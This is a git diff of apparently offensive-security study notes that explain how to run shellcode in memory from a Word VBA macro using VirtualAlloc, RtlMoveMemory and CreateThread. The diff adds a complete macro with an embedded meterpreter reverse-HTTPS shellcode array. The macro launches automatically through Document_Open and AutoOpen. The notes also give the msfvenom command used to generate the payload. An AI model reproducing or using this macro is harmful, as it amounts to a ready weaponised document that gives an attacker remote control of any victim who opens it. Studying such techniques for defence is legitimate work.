@@ -1005,9 +1005,8 @@ To execute shellcode in memory we will take use of the three Win32 API's
 
 ## VirtualAlloc
 
-[Link](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
+Used to allocate memory. [Link](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
 
-Used to allocate memory. (https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
 
 ```
 LPVOID VirtualAlloc(
@@ -1029,7 +1028,8 @@ LPVOID VirtualAlloc(
 * Integers can be translated to ``Long``
 * dwSize can be hardcoded or set dynamically using ``UBound``: ``UBound(buf)``. [Link](https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/ubound-function), also see ``LBound`` [Link](https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/lbound-function)
 
-**RtlMoveMemory**
+## RtlMoveMemory
+
 After allocating memory we must copy our desired shellcode bytes into this memory location (executable buffer). This is done using ``RtlMoveMemory``. 
 
 ```
@@ -1040,12 +1040,14 @@ VOID RtlMoveMemory(
 );
 ```
 
-destination pointer [LongPtr]: memory pointer, points to newly allocated buffer
-source buffer [Any]:address of an element from the shellcode (passed by reference)
-length [Long]: length of shellcode to be copied (passed by value)
-return value [LongPtr]: memory pointer
+|Variable [Data Type]|Description|
+|--------------------|-----------|
+|destination pointer [LongPtr]| memory pointer, points to newly allocated buffer|
+|source buffer [Any]|address of an element from the shellcode (passed by reference)|
+|length [Long]| length of shellcode to be copied (passed by value)|
+|return value [LongPtr]| memory pointer|
 
-**CreateThread**
+## CreateThread
 After copying the shelcode into the executable buffer, we can execute it with ``CreateThread``. [Link](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)
 
 ```
@@ -1059,10 +1061,57 @@ HANDLE CreateThread(
 );
 ```
 
+|Variable [Data Type]|Description|
+|--------------------|-----------|
+|lpThreadAttributes [Long] | non-default setting, can be set to "0"|
+|dwStackSize [Long] | non-default setting, can be set to "0"|
+|lpStartAddress | start address for code execution, address of our shellcode buffer|
+|lpParameter | pointer to arguments for the code residing ad start address|  
+
+* Most arguments are not needed and can be set o "0"
+* lpParameter can be "0" since our shellcode does not require arguments
 
 ## Generate Shellcode
 ```
 msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f vbapplication
+```
+
+## Entire VBA Code
+```
+Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+
+Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+
+Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
+
+Function MyMacro()
+    Dim buf As Variant
+    Dim addr As LongPtr
+    Dim counter As Long
+    Dim data As Long
+    Dim res As Long
+    
+    buf = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 226, 242, 82, 87, 139, 82, 16, 139, 74, 60, 139, 76, 17, 120, 227, 72, 1, 209, 81, 139, 89, 32, 1, 211, 139, 73, 24, 227, 58, 73, 139, 52, 139, 1, 214, 49, 255, 172, 193, _
+...
+49, 57, 50, 46, 49, 54, 56, 46, 49, 55, 54, 46, 49, 52, 50, 0, 187, 224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213)
+
+    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
+    
+    For counter = LBound(buf) To UBound(buf)
+        data = buf(counter)
+        res = RtlMoveMemory(addr + counter, data, 1)
+    Next counter
+    
+    res = CreateThread(0, 0, addr, 0, 0, 0)
+End Function 
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
 ```
 
 
